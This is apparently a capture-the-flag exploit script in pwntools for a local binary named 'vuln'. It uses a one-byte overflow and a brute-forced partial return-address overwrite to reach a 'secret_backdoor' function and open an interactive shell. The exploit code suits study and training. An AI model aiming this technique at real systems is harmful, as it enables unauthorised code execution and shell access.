#!/bin/python3
from pwn import *
import sys

binary = "./vuln"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
#context.log_level  = 'debug'
#libc = elf.libc
rop = ROP(elf)

script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():

    ## can only overflow into 1 byte (LSB) | overwrite with 0xff = 255

    ini_payload = flat(
        cyclic(40),
        0xff
    )


    offset = 192 + 8
    win_demo = 0x189

    final_payload = flat(
        cyclic(255),
        p16(win_demo)
    )

    while True:
        try:
            io = start()
            io.sendline(ini_payload)
            #io.sendlineafter(">>: ", payload)
            io.sendline(final_payload)
            io.sendline(b"echo pwned")
            res = io.recv(timeout=1)
            if b"pwned" in res:
                print(f"[+] Success! Jumped to secret_backdoor ")
                io.interactive()
                break
            io.close()
        except:
            continue
    # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/xff

if __name__ == "__main__":
    main()